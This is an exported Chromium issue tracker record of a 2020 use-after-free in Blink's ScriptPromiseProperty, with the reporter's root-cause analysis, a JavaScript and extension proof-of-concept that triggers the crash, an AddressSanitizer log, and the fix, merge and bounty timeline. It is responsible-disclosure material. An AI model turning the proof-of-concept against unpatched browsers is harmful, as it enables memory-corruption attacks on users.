# Security: UAF in ScriptPromiseProperty due to iterator invalidation

| Field | Value |
|-------|-------|
| **Issue ID** | [40052920](https://issues.chromium.org/issues/40052920) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Bindings |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | tj...@theori.io |
| **Assignee** | yh...@chromium.org |
| **Created** | 2020-07-22 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**

ScriptPromiseProperty is used to implement properties of DOM objects which are promises, e.g. |navigator.serviceWorker.ready| or |document.fonts.ready|.

Internally, ScriptPromiseProperty stores a ScriptPromiseResolver for each World that accesses it. The following links explain what a World is and how they relate to Frames and JS ExecutionContexts.  

<https://chromium.googlesource.com/chromium/src/+/master/third_party/blink/renderer/bindings/core/v8/V8BindingDesign.md>  

<https://drive.google.com/file/d/0B1obCOyvTnPKQmJEWkVtOEN2TmM/view>

When a ScriptPromiseProperty is resolved, it iterates the resolvers for each world and resolves each one:

template <typename PassResolvedType>  

void Resolve(PassResolvedType value) {  

...  

state\_ = kResolved;  

resolved\_ = value;  

for (const Member<ScriptPromiseResolver>& resolver : resolvers\_) { // iterate resolvers for each World  

resolver->Resolve(resolved\_); // can execute user script  

}  

...  

}

As in other similar bugs, |resolver->Resolve| can cause script to be executed. If this script invalidates the for loop iterator, then |resolver->Resolve(resolved\_)| will be invoked on stale resolve pointer. The easiest way to achieve this is by causing a call to ScriptPromiseProperty::Reset

void Reset() {  

...  

resolvers\_.clear();  

...  

}

In order to trigger the UAF, there must be at least two elements in |resolvers\_|, so we need to access the property from two distinct worlds.

In the PoC below, we target the |document.fonts.ready| property from the main script world and from a content script (chrome extension). I'm not sure if there's an easier way to access the property from another world.

**VERSION**  

stable

**REPRODUCTION CASE**

This PoC requires two font files, attached.

Main page:

<html>
<script>
function addFont(name) {
src = 'url(' + name + '.woff2)';
var f = new FontFace(name, src);
f.load();
document.fonts.add(f);
}
```
var count = 0;  
Object.defineProperty(Object.prototype, "then", { get() {  
  console.log("then getter " + count);  
  if (count++ == 1) {  
    addFont('font1'); // cause a call to ScriptPromiseProperty::Reset  
  }  
}});  

addFont('font0');  
document.fonts.ready.then(function() {});  

```
 </script>
</html>

content script code:

document.fonts.ready.then(function() {});

Extension manifest:

{  

"name": "Getting Started Example",  

"version": "1.0",  

"description": "Build an Extension!",  

"content\_scripts": [  

{  

"matches": ["http://localhost:8080/\*"],  

"js": ["contentScript.js"]  

}  

],  

"permissions": [  

"activeTab"  

],  

"manifest\_version": 2  

}

ASAN log:  

==52395==ERROR: AddressSanitizer: use-after-poison on address 0x7e8fbabbe088 at pc 0x7fb825e63df1 bp 0x7fffcd04c010 sp 0x7fffcd04c008  

READ of size 8 at 0x7e8fbabbe088 thread T0 (chrome)  

#0 0x7fb825e63df0 in blink::MemberBase<blink::ScriptPromiseResolver, (blink::TracenessMemberConfiguration)0>::GetRaw() const third\_party/blink/renderer/platform/heap/member.h:250:44  

#1 0x7fb825e63984 in blink::MemberBase<blink::ScriptPromiseResolver, (blink::TracenessMemberConfiguration)0>::operator->() const third\_party/blink/renderer/platform/heap/member.h:185:34  

#2 0x7fb8268db392 in void blink::ScriptPromiseProperty<blink::Member[blink::FontFaceSet](javascript:void(0);), blink::Member[blink::DOMException](javascript:void(0);) >::Resolve[blink::FontFaceSet\\*](javascript:void(0);)(blink::FontFaceSet\*) third\_party/blink/renderer/bindings/core/v8/script\_promise\_property.h:106:7  

#3 0x7fb8268d8b49 in blink::FontFaceSet::FireDoneEvent() third\_party/blink/renderer/core/css/font\_face\_set.cc:256:13  

#4 0x7fb8268f43d0 in blink::FontFaceSetDocument::FireDoneEventIfPossible() third\_party/blink/renderer/core/css/font\_face\_set\_document.cc:158:3  

#5 0x7fb8268d55c3 in blink::FontFaceSet::HandlePendingEventsAndPromises() third\_party/blink/renderer/core/css/font\_face\_set.cc:35:3  

#6 0x7fb8268deea9 in void base::internal::FunctorTraits<void (blink::FontFaceSet::\*)(), void>::Invoke<void (blink::FontFaceSet::\*)(), blink::Persistent[blink::FontFaceSet](javascript:void(0);) >(void (blink::FontFaceSet::\*)(), blink::Persistent[blink::FontFaceSet](javascript:void(0);)&&) base/bind\_internal.h:498:12  

#7 0x7fb8268debd3 in void base::internal::InvokeHelper<false, void>::MakeItSo<void (blink::FontFaceSet::\*)(), blink::Persistent[blink::FontFaceSet](javascript:void(0);) >(void (blink::FontFaceSet::\*&&)(), blink::Persistent[blink::FontFaceSet](javascript:void(0);)&&) base/bind\_internal.h:637:12  

#8 0x7fb8268de9f1 in void base::internal::Invoker<base::internal::BindState<void (blink::FontFaceSet::\*)(), blink::Persistent[blink::FontFaceSet](javascript:void(0);) >, void ()>::RunImpl<void (blink::FontFaceSet::\*)(), std::\_\_Cr::tuple<blink::Persistent[blink::FontFaceSet](javascript:void(0);) >, 0ul>(void (blink::FontFaceSet::\*&&)(), std::\_\_Cr::tuple<b  

link::Persistent[blink::FontFaceSet](javascript:void(0);) >&&, std::\_\_Cr::integer\_sequence<unsigned long, 0ul>) base/bind\_internal.h:710:12  

#9 0x7fb8268de9a8 in base::internal::Invoker<base::internal::BindState<void (blink::FontFaceSet::\*)(), blink::Persistent[blink::FontFaceSet](javascript:void(0);) >, void ()>::RunOnce(base::internal::BindStateBase\*) base/bind\_internal.h:679:12  

#10 0x7fb8257c817c in base::OnceCallback<void ()>::Run() && base/callback.h:99:12  

#11 0x7fb8257c803c in WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::RunInternal(base::OnceCallback<void ()>\*) third\_party/blink/renderer/platform/wtf/functional.h:264:33  

#12 0x7fb8257c5813 in WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::Run() third\_party/blink/renderer/platform/wtf/functional.h:249:12  

#13 0x7fb8257c7009 in void base::internal::FunctorTraits<void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*)(), void>::Invoke<void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*)(), std::\_\_Cr::unique\_ptr<WTF::ThreadCheckingCallbackWrapper<base::OnceCall  

back<void ()>, void ()>, std::\_\_Cr::default\_delete<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()> > > >(void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*)(), std::\_*Cr::unique\_ptr<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>, std::*  

\_Cr::default\_delete<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()> > >&&) base/bind\_internal.h:498:12  

#14 0x7fb8257c6d33 in void base::internal::InvokeHelper<false, void>::MakeItSo<void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*)(), std::\_\_Cr::unique\_ptr<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>, std::\_\_Cr::default\_delete<WTF::ThreadCheckingCallback  

Wrapper<base::OnceCallback<void ()>, void ()> > > >(void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*&&)(), std::\_\_Cr::unique\_ptr<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>, std::\_\_Cr::default\_delete<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<vo  

id ()>, void ()> > >&&) base/bind\_internal.h:637:12  

#15 0x7fb8257c6b51 in void base::internal::Invoker<base::internal::BindState<void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*)(), std::\_\_Cr::unique\_ptr<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>, std::\_\_Cr::default\_delete<WTF::ThreadCheckingCallbackWr  

apper<base::OnceCallback<void ()>, void ()> > > >, void ()>::RunImpl<void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*)(), std::\_\_Cr::tuple<std::\_\_Cr::unique\_ptr<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>, std::\_\_Cr::default\_delete<WTF::ThreadCheckingCallb  

ackWrapper<base::OnceCallback<void ()>, void ()> > > >, 0ul>(void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*&&)(), std::\_\_Cr::tuple<std::\_\_Cr::unique\_ptr<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>, std::\_\_Cr::default\_delete<WTF::ThreadCheckingCallbackWra  

pper<base::OnceCallback<void ()>, void ()> > > >&&, std::\_\_Cr::integer\_sequence<unsigned long, 0ul>) base/bind\_internal.h:710:12  

#16 0x7fb8257c6b08 in base::internal::Invoker<base::internal::BindState<void (WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>::\*)(), std::\_\_Cr::unique\_ptr<WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void ()>, void ()>, std::\_\_Cr::default\_delete<WTF::ThreadCheckingCallbackWrapper  

<base::OnceCallback<void ()>, void ()> > > >, void ()>::RunOnce(base::internal::BindStateBase\*) base/bind\_internal.h:679:12  

#17 0x7fb892e87e0c in base::OnceCallback<void ()>::Run() && base/callback.h:99:12

PATCH

A copy of resolvers\_ should be iterated instead.

**CREDIT INFORMATION**  

Reporter credit: Tim Becker of Theori

## Attachments

- [font0.woff2](attachments/font0.woff2) (application/octet-stream, 64.2 KB)
- [font1.woff2](attachments/font1.woff2) (application/octet-stream, 64.2 KB)

## Timeline

### aj...@google.com (2020-07-22)

Thanks for the report. It can be helpful for extension related reports to have all files as 'uploads'.

CC'ing based on blame. Please look into this security issue, or suggest a more suitable person to take a deeper look.

[Monorail components: Blink>Bindings]

### [Deleted User] (2020-07-23)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-07-23)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aj...@google.com (2020-07-27)

Gentle (post-holiday!) ping.

### yh...@chromium.org (2020-07-29)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-07-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/6d18e924b9c426905434cc280d7b602b3a3379ed

commit 6d18e924b9c426905434cc280d7b602b3a3379ed
Author: Yutaka Hirano <yhirano@chromium.org>
Date: Wed Jul 29 12:36:23 2020

Fix UAF in ScriptPromiseProperty caused by reentrant code

v8::Promise::Resolve can run user code synchronously, which caused a UAF
in ScriptPromiseProperty. Fix it.

Bug: 1108518
Change-Id: Ia9baec6eef0887323cd88ceb1d3fa0c14fdb77ef
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2325499
Reviewed-by: Yuki Shiino <yukishiino@chromium.org>
Commit-Queue: Yutaka Hirano <yhirano@chromium.org>
Cr-Commit-Position: refs/heads/master@{#792661}

[modify] https://crrev.com/6d18e924b9c426905434cc280d7b602b3a3379ed/third_party/blink/renderer/bindings/core/v8/script_promise_property.h
[modify] https://crrev.com/6d18e924b9c426905434cc280d7b602b3a3379ed/third_party/blink/renderer/bindings/core/v8/script_promise_property_test.cc


### yh...@chromium.org (2020-07-31)

Reporter, could you verify the fix with 86.0.4217.0 or later?

### ad...@google.com (2020-08-03)

yhirano@ if you are confident that this is fixed, please mark the bug as such, and Sheriffbot will arrange to add merge requests. Until this is merged to M84, folks will be looking at https://crbug.com/chromium/1108518#c6 in our git branches and trying to work out how to exploit it. There will be an M84 stable refresh early next week, for which we'd need to merge fixes by approximately Thursday this week.

### tj...@theori.io (2020-08-03)

Apologies for missing https://crbug.com/chromium/1108518#c7. The fix seems to work and is consistent with how similar issues were fixed.

### yh...@chromium.org (2020-08-04)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-04)

This bug requires manual review: M85's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), dgagnon@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### yh...@chromium.org (2020-08-04)

1. Does your merge fit within the Merge Decision Guidelines?
Yes.
2. Links to the CLs you are requesting to merge.
https://chromium-review.googlesource.com/c/chromium/src/+/2325499
3. Has the change landed and been verified on master/ToT?
Yes.
4. Why are these changes required in this milestone after branch?
It is a fix of a use-after-free bug.
5. Is this a new feature?
No.
6. If it is a new feature, is it behind a flag using finch?
N/A


### yh...@chromium.org (2020-08-04)

Thank you for verifying the fix!

### yh...@chromium.org (2020-08-04)

ajgo@, do you think this should be merged to M84?

### sr...@google.com (2020-08-04)

Merge approved for M85 branch:4183 please merge your changes asap before 2pm PST today so it can go out in beta release tomorrow

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-08-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4756faac81b5cc59fe9d8ea5af10e7a6bf7e85d6

commit 4756faac81b5cc59fe9d8ea5af10e7a6bf7e85d6
Author: Yutaka Hirano <yhirano@chromium.org>
Date: Wed Aug 05 09:55:32 2020

Fix UAF in ScriptPromiseProperty caused by reentrant code

v8::Promise::Resolve can run user code synchronously, which caused a UAF
in ScriptPromiseProperty. Fix it.

Bug: 1108518
Change-Id: Ia9baec6eef0887323cd88ceb1d3fa0c14fdb77ef
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2325499
Reviewed-by: Yuki Shiino <yukishiino@chromium.org>
Commit-Queue: Yutaka Hirano <yhirano@chromium.org>
Cr-Commit-Position: refs/heads/master@{#792661}
(cherry picked from commit 6d18e924b9c426905434cc280d7b602b3a3379ed)


TBR=yhirano@chromium.org

Change-Id: If523b9f55eaa1be25dd2e664cdc1a77cd4e482b5
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2338455
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Commit-Queue: Yutaka Hirano <yhirano@chromium.org>
Cr-Commit-Position: refs/branch-heads/4183@{#1228}
Cr-Branched-From: 740e9e8a40505392ba5c8e022a8024b3d018ca65-refs/heads/master@{#782793}

[modify] https://crrev.com/4756faac81b5cc59fe9d8ea5af10e7a6bf7e85d6/third_party/blink/renderer/bindings/core/v8/script_promise_property.h
[modify] https://crrev.com/4756faac81b5cc59fe9d8ea5af10e7a6bf7e85d6/third_party/blink/renderer/bindings/core/v8/script_promise_property_test.cc


### aj...@google.com (2020-08-05)

Answering #14 - yep this looks like a good candidate to merge to stable.

### aj...@google.com (2020-08-05)

Marking Fixed to help security processes.

### yh...@chromium.org (2020-08-05)

OK, let's try...

### [Deleted User] (2020-08-05)

[Empty comment from Monorail migration]

### mm...@chromium.org (2020-08-05)

yhirano@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### yh...@chromium.org (2020-08-06)

>#21 

Done.

### pb...@google.com (2020-08-06)

+Adetaylor@(Security TPM) for merge decision.

### ad...@chromium.org (2020-08-06)

Approving merge to M84, branch 4147. If it's looking good in Canary, and you're completely confident in the stability of the fix, it would be great to get this merged as soon as possible so that it goes out in the scheduled security refresh early next week (for which the branch will be cut tomorrow).

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-08-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9d100199c92bc8660a9488078daad41e435e4748

commit 9d100199c92bc8660a9488078daad41e435e4748
Author: Yutaka Hirano <yhirano@chromium.org>
Date: Fri Aug 07 09:06:23 2020

Fix UAF in ScriptPromiseProperty caused by reentrant code

v8::Promise::Resolve can run user code synchronously, which caused a UAF
in ScriptPromiseProperty. Fix it.

Bug: 1108518
Change-Id: Ia9baec6eef0887323cd88ceb1d3fa0c14fdb77ef
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2325499
Reviewed-by: Yuki Shiino <yukishiino@chromium.org>
Commit-Queue: Yutaka Hirano <yhirano@chromium.org>
Cr-Commit-Position: refs/heads/master@{#792661}
(cherry picked from commit 6d18e924b9c426905434cc280d7b602b3a3379ed)


TBR=yhirano@chromium.org

Change-Id: I3b7bfd5e8d932fb59c292159a4526cf70b44c58b
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2342489
Commit-Queue: Yutaka Hirano <yhirano@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Cr-Commit-Position: refs/branch-heads/4147@{#1049}
Cr-Branched-From: 16307825352720ae04d898f37efa5449ad68b606-refs/heads/master@{#768962}

[modify] https://crrev.com/9d100199c92bc8660a9488078daad41e435e4748/third_party/blink/renderer/bindings/core/v8/script_promise_property.h
[modify] https://crrev.com/9d100199c92bc8660a9488078daad41e435e4748/third_party/blink/renderer/bindings/core/v8/script_promise_property_test.cc


### ad...@google.com (2020-08-07)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-07)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-10)

[Empty comment from Monorail migration]

### mm...@google.com (2020-08-11)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-13)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-08-13)

Congratulations! Once again, the VRP panel decided to award $7500 for this report.

### ad...@google.com (2020-08-13)

[Empty comment from Monorail migration]

### ad...@google.com (2020-09-21)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-11)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1108518?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052920)*
